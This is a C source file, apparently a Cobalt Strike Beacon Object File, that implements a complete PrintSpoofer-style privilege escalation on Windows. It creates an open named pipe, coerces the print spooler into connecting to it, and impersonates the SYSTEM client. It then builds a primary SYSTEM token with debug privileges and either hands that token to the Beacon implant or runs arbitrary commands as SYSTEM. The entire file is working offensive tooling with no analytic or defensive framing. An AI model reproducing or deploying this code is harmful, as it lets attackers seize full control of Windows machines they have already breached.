#include <handleapi.h>
#include <minwinbase.h>
#include <minwindef.h>
#include <sddl.h>
#include <windows.h>
#include <winerror.h>
#include <winnt.h>
#include <x86gprintrin.h>
#include "beacon.h"
#include "ms-rprn_h.h"

DECLSPEC_IMPORT RPC_STATUS WINAPI RPCRT4$UuidCreate(UUID*);
DECLSPEC_IMPORT RPC_STATUS WINAPI RPCRT4$UuidToStringA(UUID*, unsigned char**);
DECLSPEC_IMPORT int    __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void   __cdecl MSVCRT$free(void*);
DECLSPEC_IMPORT RPC_STATUS WINAPI RPCRT4$RpcStringFreeA(unsigned char**);
DECLSPEC_IMPORT RPC_STATUS WINAPI RPCRT4$RpcStringBindingComposeW(RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR*);
DECLSPEC_IMPORT RPC_STATUS WINAPI RPCRT4$RpcBindingFromStringBindingW(RPC_WSTR, RPC_BINDING_HANDLE*);
DECLSPEC_IMPORT RPC_STATUS WINAPI RPCRT4$RpcStringFreeW(RPC_WSTR*);
DECLSPEC_IMPORT RPC_STATUS WINAPI RPCRT4$RpcBindingFree(RPC_BINDING_HANDLE*);
DECLSPEC_IMPORT CLIENT_CALL_RETURN WINAPI RPCRT4$NdrClientCall3(PMIDL_STUBLESS_PROXY_INFO, unsigned int, void*, ...);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(LPCSTR, DWORD, PSECURITY_DESCRIPTOR, PULONG);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateNamedPipeA(LPCSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetComputerNameW(LPWSTR, LPDWORD);
DECLSPEC_IMPORT int    WINAPI MSVCRT$_snwprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PVOID, DWORD, PVOID, PDWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$SetEvent(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$SetHandleInformation(HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ConnectNamedPipe(HANDLE, LPOVERLAPPED);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetOverlappedResult(HANDLE, LPOVERLAPPED, LPDWORD, BOOL);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetNamedPipeClientProcessId(HANDLE, PULONG);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ImpersonateNamedPipeClient(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$SetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ProcessIdToSessionId(DWORD, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DisconnectNamedPipe(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetExitCodeThread(HANDLE, LPDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTempPathA(DWORD, LPSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeleteFileW(LPCWSTR);


#define NdrClientCall3 RPCRT4$NdrClientCall3
#ifndef _M_AMD64
#define _M_AMD64 1
#endif
#include "ms-rprn_c.c"

#define CP(tag) BeaconPrintf(CALLBACK_OUTPUT, "[dbg] %s\n", tag)

static char g_uuid[64];
static char g_pipeName[256];


typedef struct {
    char uuid[64];      
    volatile int rpc_ok; 
} TriggerParam;


void __RPC_FAR * __RPC_USER midl_user_allocate(size_t n) { return MSVCRT$malloc(n); }
void __RPC_USER midl_user_free(void __RPC_FAR *p)        { MSVCRT$free(p); }

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr) {
    RPC_STATUS RpcStatus;
    RPC_WSTR   StringBinding;
    handle_t   BindingHandle;

    if (RPCRT4$RpcStringBindingComposeW(
            (RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB",
            (RPC_WSTR)L"ncacn_np",
            (RPC_WSTR)lpStr,
            (RPC_WSTR)L"\\pipe\\spoolss",
            NULL, &StringBinding) != RPC_S_OK)
        return NULL;

    RpcStatus = RPCRT4$RpcBindingFromStringBindingW(StringBinding, &BindingHandle);
    RPCRT4$RpcStringFreeW(&StringBinding);

    if (RpcStatus != RPC_S_OK)
        return NULL;

    return BindingHandle;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t h) {
    (void)lpStr;
    RPCRT4$RpcBindingFree(&h);
}

EXCEPTION_DISPOSITION
rpc_except_handler(struct _EXCEPTION_RECORD *r, void *f,
                   struct _CONTEXT *c, void *d) {
    (void)r; (void)f; (void)c; (void)d;
    return ExceptionExecuteHandler;
}

static DWORD WINAPI TriggerThread(LPVOID lpParam){
    TriggerParam *p = (TriggerParam *)lpParam;

    KERNEL32$Sleep(500);

    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
    KERNEL32$GetComputerNameW(hostname, &len);

    wchar_t targetServer[MAX_PATH] = {0};
    MSVCRT$_snwprintf(targetServer, MAX_PATH, L"\\\\%ws", hostname);

    wchar_t captureServer[MAX_PATH] = {0};
    MSVCRT$_snwprintf(captureServer, MAX_PATH, L"\\\\127.0.0.1/pipe/%hs", p->uuid);

    PRINTER_HANDLE hPrinter = NULL;
    DEVMODE_CONTAINER devmodeContainer = {0};

    __try1(rpc_except_handler) {
        if (RpcOpenPrinter(targetServer, &hPrinter, NULL, &devmodeContainer, 0) == RPC_S_OK) {
            p->rpc_ok = 1;
            RpcRemoteFindFirstPrinterChangeNotificationEx(
                hPrinter, PRINTER_CHANGE_ADD_JOB, 0, captureServer, 0, NULL);
            RpcClosePrinter(&hPrinter);
        } else {
            p->rpc_ok = -1; 
        }
    } __except1 {}

    return 0;
}

static void EnablePrivOnToken(HANDLE hToken, const char* privName){
    LUID luid;
    if (!ADVAPI32$LookupPrivilegeValueA(NULL, privName, &luid)){
        return;
    }
    TOKEN_PRIVILEGES tp = {1, {{luid,SE_PRIVILEGE_ENABLED}}};
    ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

}



void go(char* args, int len){
    CP("go enter");
    datap parser;
    BeaconDataParse(&parser, args, len);

    char* cmd = BeaconDataExtract(&parser, NULL);
    CP("args parsed");

    UUID uuid;
    unsigned char* uuidStr = NULL;
    RPCRT4$UuidCreate(&uuid);
    RPCRT4$UuidToStringA(&uuid, &uuidStr);

    MSVCRT$_snprintf(g_uuid, sizeof(g_uuid), "%s", (char*)uuidStr);
    MSVCRT$_snprintf(g_pipeName, sizeof(g_pipeName), "\\\\.\\pipe\\%s\\pipe\\spoolss", g_uuid);
    RPCRT4$RpcStringFreeA(&uuidStr);
    CP("uuid done");

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Pipe: %s\n", g_pipeName);

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, FALSE};
    ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA("D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &sa.lpSecurityDescriptor, NULL);
    CP("sddl ok");

    HANDLE hPipe = KERNEL32$CreateNamedPipeA(g_pipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,  PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);

    if (hPipe == INVALID_HANDLE_VALUE){
        BeaconPrintf(CALLBACK_OUTPUT, "[-] CreateNamedPipeA failed: %lu\n", KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Pipe Created, waiting for SYSTEM...\n");

    TriggerParam *trigParam = NULL;
    HANDLE hThread = NULL;

    trigParam = (TriggerParam *)MSVCRT$malloc(sizeof(TriggerParam));
    if (!trigParam) {
        BeaconPrintf(CALLBACK_ERROR, "[-] malloc for TriggerParam failed");
        goto cleanup;
    }
    MSVCRT$_snprintf(trigParam->uuid, sizeof(trigParam->uuid), "%s", g_uuid);
    trigParam->rpc_ok = 0;
    hThread = KERNEL32$CreateThread(NULL, 0, TriggerThread, trigParam, 0, NULL);
    CP("trigger thread started");

    OVERLAPPED ov = {0};
    ov.hEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
    CP("event created, waiting on pipe");

    if (!KERNEL32$ConnectNamedPipe(hPipe, &ov)) {
        DWORD e = KERNEL32$GetLastError();
        if (e == ERROR_PIPE_CONNECTED) {
            KERNEL32$SetEvent(ov.hEvent);   
        } else if (e != ERROR_IO_PENDING) {
            BeaconPrintf(CALLBACK_ERROR, "[-] ConnectNamedPipe failed: %lu", e);
            goto cleanup;
        }
    }
    CP("connect started");

    if (KERNEL32$WaitForSingleObject(ov.hEvent, 5000) == WAIT_TIMEOUT){
        if (trigParam && trigParam->rpc_ok == -1)
            BeaconPrintf(CALLBACK_ERROR, "[-] Timed out — RpcOpenPrinter failed (Spooler disabled?)");
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] Timed out — SYSTEM never connected to pipe");
        goto cleanup;
    }
    CP("pipe connected");

    DWORD transferred = 0;
    KERNEL32$GetOverlappedResult(hPipe, &ov, &transferred, FALSE);
    KERNEL32$CloseHandle(ov.hEvent);
    ov.hEvent = NULL;   
    CP("overlapped done");

    ULONG clientPid = 0;
    KERNEL32$GetNamedPipeClientProcessId(hPipe, &clientPid);
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Client connected! PID: %lu\n", clientPid);

    if (!ADVAPI32$ImpersonateNamedPipeClient(hPipe)) {
      BeaconPrintf(CALLBACK_ERROR,"[-] ImpersonateNamedPipeClient failed: %lu\n", KERNEL32$GetLastError());
      goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT ,"[+] Impersonating pipe client\n");

    HANDLE hThreadTok = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE, FALSE, &hThreadTok)) {
      BeaconPrintf(CALLBACK_ERROR , "[-] OpenThreadToken failed: %lu\n", KERNEL32$GetLastError());
      ADVAPI32$RevertToSelf();
      goto cleanup;
    }
    CP("thread token opened");

    SECURITY_IMPERSONATION_LEVEL lvl;
    DWORD cbLvl = sizeof(lvl);
    ADVAPI32$GetTokenInformation(hThreadTok, TokenImpersonationLevel, &lvl, cbLvl, &cbLvl);
    if  (lvl < SecurityImpersonation){
        BeaconPrintf(CALLBACK_ERROR, "[!] Token level too low (%d) - unusable", lvl);
        KERNEL32$CloseHandle(hThreadTok);
        ADVAPI32$RevertToSelf();
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT , "[+] Impersonation level OK(%d)\n", lvl);

    HANDLE hPrimary = NULL;
    if (!ADVAPI32$DuplicateTokenEx(hThreadTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary)) {
      BeaconPrintf(CALLBACK_ERROR ,"[-]DuplicateTokenEx failed: %lu\n", KERNEL32$GetLastError());
      KERNEL32$CloseHandle(hThreadTok);
      ADVAPI32$RevertToSelf();
      goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] primary SYSTEM token forged\n");

    ADVAPI32$RevertToSelf();
    KERNEL32$CloseHandle(hThreadTok);
    CP("reverted to self");

    EnablePrivOnToken(hPrimary, "SeDebugPrivilege");
    EnablePrivOnToken(hPrimary, "SeAssignPrimaryTokenPrivilege");
    EnablePrivOnToken(hPrimary, "SeIncreaseWorkingSetPrivilege");
    CP("privs enabled");

    {
        DWORD sessionId = 0;
        if (KERNEL32$ProcessIdToSessionId(KERNEL32$GetCurrentProcessId(), &sessionId)) {
            ADVAPI32$SetTokenInformation(hPrimary, TokenSessionId, &sessionId, sizeof(sessionId));
        }
    }

    if (!cmd || !*cmd || (cmd[0] == 't')) {
        BeaconPrintf(CALLBACK_OUTPUT,"[+] Applying SYSTEM token to Beacon — use 'rev2self' to revert\n");
        BeaconUseToken(hPrimary);
        CP("BeaconUseToken done");
    } else {
        CP("cmd mode entered");
        wchar_t app[]        = L"C:\\Windows\\System32\\cmd.exe";
        wchar_t userCmd[300] = {0};
        wchar_t cmdline[512] = {0};
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, cmd, -1, userCmd, 299);

        char   tmpDirA[MAX_PATH] = {0};
        wchar_t *outFile = NULL;
        if (KERNEL32$GetTempPathA(MAX_PATH, tmpDirA)) {
            outFile = (wchar_t *)MSVCRT$malloc((MAX_PATH + 32) * sizeof(wchar_t));
            if (outFile) {
                MSVCRT$_snwprintf(outFile, MAX_PATH + 32, L"%hsspo_%hs.out",tmpDirA, g_uuid);

                MSVCRT$_snwprintf(cmdline, 512,L"\"%ls\" /d /s /c \"%ls > \"%ls\" 2>&1\"",app, userCmd, outFile);
                BeaconPrintf(CALLBACK_OUTPUT, "[dbg] cmdline: %ls\n", cmdline);
            }
        }

        SECURITY_ATTRIBUTES psa = {sizeof(psa), NULL, TRUE};
        HANDLE hReadPipe = NULL, hWritePipe = NULL;

        if (!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &psa, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] CreatePipe failed: %lu\n", KERNEL32$GetLastError());
        } else {
            KERNEL32$SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

            STARTUPINFOW si = {sizeof(si)};
            si.dwFlags    = STARTF_USESTDHANDLES;
            si.hStdInput  = NULL;
            si.hStdOutput = hWritePipe;
            si.hStdError  = hWritePipe;
            PROCESS_INFORMATION pi = {0};

            if (!outFile) {
                BeaconPrintf(CALLBACK_ERROR, "[-] could not build temp output path\n");
            } else if (ADVAPI32$CreateProcessWithTokenW(hPrimary, 0, app, cmdline, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] SYSTEM process spawned! PID: %lu\n", pi.dwProcessId);
                KERNEL32$CloseHandle(hWritePipe);

                KERNEL32$WaitForSingleObject(pi.hProcess, 10000);
                DWORD procExit = 0;
                KERNEL32$GetExitCodeProcess(pi.hProcess, &procExit);
                if (procExit == STILL_ACTIVE)
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[*] child still running (259) — expected for long-lived payloads\n");
                else
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] cmd exit code: %lu\n", procExit);

                HANDLE hFile = KERNEL32$CreateFileW(outFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    char *outbuf = (char *)MSVCRT$malloc(4096);
                    DWORD bytesRead = 0;
                    while (outbuf && KERNEL32$ReadFile(hFile, outbuf, 4095, &bytesRead, NULL) && bytesRead > 0) {
                        outbuf[bytesRead] = '\0';
                        BeaconPrintf(CALLBACK_OUTPUT, "%s", outbuf);
                    }
                    if (outbuf) MSVCRT$free(outbuf);
                    KERNEL32$CloseHandle(hFile);
                } else {
                    BeaconPrintf(CALLBACK_ERROR, "[-] output file missing (error %lu)\n",KERNEL32$GetLastError());
                }
                KERNEL32$DeleteFileW(outFile);

                KERNEL32$CloseHandle(pi.hProcess);
                KERNEL32$CloseHandle(pi.hThread);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] CreateProcessWithTokenW failed: %lu\n", KERNEL32$GetLastError());
                KERNEL32$CloseHandle(hWritePipe);
            }
            if (outFile) MSVCRT$free(outFile);
            KERNEL32$CloseHandle(hReadPipe);
        }
    }

    KERNEL32$CloseHandle(hPrimary);
    CP("main done, cleanup");

cleanup:
    if (ov.hEvent) KERNEL32$CloseHandle(ov.hEvent);
    KERNEL32$DisconnectNamedPipe(hPipe);
    KERNEL32$CloseHandle(hPipe);
    if (hThread) {
        DWORD trigExit = 0;
        KERNEL32$WaitForSingleObject(hThread, 3000);
        if (KERNEL32$GetExitCodeThread(hThread, &trigExit) && trigExit != STILL_ACTIVE) {
            if (trigParam) MSVCRT$free(trigParam);
        }
        KERNEL32$CloseHandle(hThread);
    } else if (trigParam) {
        MSVCRT$free(trigParam);
    }
}
